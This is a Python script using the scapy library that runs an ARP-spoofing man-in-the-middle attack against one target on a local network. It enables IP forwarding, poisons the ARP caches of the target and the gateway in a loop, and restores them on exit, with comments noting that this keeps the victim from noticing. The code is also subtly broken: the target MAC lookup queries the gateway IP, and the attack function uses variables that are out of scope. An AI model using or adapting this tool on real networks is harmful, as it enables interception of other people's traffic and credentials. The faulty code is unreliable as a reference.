import os, sys, time, argparse
from scapy.all import *

# Create Arguments Parser
parser = argparse.ArgumentParser()
parser.description = "Man In The Middle Attack"
parser.add_argument("interface", help="Wifi Interface Name")
parser.add_argument("targetIP", help="Target IP [Working only for one target RIGHT NOW]")

parser.add_argument("-g", "--gateway-ip", help="Gateway IP, By Default '192.168.1.1'", default = "192.168.1.1", type=str)
parser.add_argument("-s", "--sleep", help="Add timer for attack sleeping, Default = 5(sec)", default=5, type=int)
parser.add_argument("-t", "--timeout", help="Packet Send Receive Timeout, Default = 10(sec)", default=10, type=int)

# Parse Arguments
args = parser.parse_args()

# Get Options
interface = args.interface
target_ip = args.targetIP
gateway_ip = args.gateway_ip
timer = args.sleep
timeout = args.timeout

#turn on port forwarding until restart
def setIPForwarding(toggle):
	if(toggle == True):
		print("~~~Turing on IP forwarding...")
		#for OSX
		# os.system('sysctl -w net.inet.ip.forwarding=1')
		
		#other
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	if(toggle == False):
		print("~~~Turing off IP forwarding...")
		#for OSX
		# os.system('sysctl -w net.inet.ip.forwarding=0')
		
		#other
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

#need to get mac addresses of target and gateway
#do this by generating ARP requests, which are made
#for getting MAC addresses
def get_mac(ip):
	
	# srp() send/recive packets at layer 2 (ARP)
	# Generate a Ether() for ethernet connection/ARP request (?)
	# timeout 2, units seconds(?) 
	# interface, wlan0, wlan1, etc...
	# inter, time .1 seconds to retry srp()
	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = timeout, iface=interface, inter = 0.1)

	#I'm not exactly sure as to what how this works, but it gets the data we need
	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")

#this is too restablish the connection between the router
#and victim after we are done intercepting IMPORTANT
#victim will notice very quickly if this isn't done
def reassignARP():
	print("~~~Reassigning ARPS...")

	#get target mac address
	target_mac = get_mac(target_ip)
	
	#get gateway mac address
	gateway_mac = get_mac(gateway_ip)

	#send ARP request to router as-if from target to connect, 
	#do it 7 times to be sure
	send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, retry=7))

	#send ARP request to target as-if from router to connect
	#do it 7 times to be sure
	send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac, retry=7))

	#don't need this anymore
	setIPForwarding(False)

#this is the actuall attack
#sends a single ARP request to both targets
#saying that we are the other the other target
#so it's puts us inbetween!
#funny how it's the smallest bit of code
def attack():
	send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
	send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

def manInTheMiddle():

	conf.verb = 0
	setIPForwarding(True)

	print("~~~Getting MAC Addresses...")
	try:
		target_mac = get_mac(gateway_ip)
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting target MAC...")
		print(e)
		sys.exit(1)

	try:
		gateway_mac = get_mac(gateway_ip)
	except Exception, e:
		setIPForwarding(False)
		print("~!~Error getting gateway MAC...")
		print(e)
		sys.exit(1)

	print("~~~Target MAC: %s" % target_mac)
	print("~~~Gateway MAC: %s" % gateway_mac)
	print("~~~Attacking...")

	while True:
		try:
			attack()
			time.sleep(timer)
		except KeyboardInterrupt:
			reassignARP()
			break
	sys.exit(1)

manInTheMiddle()
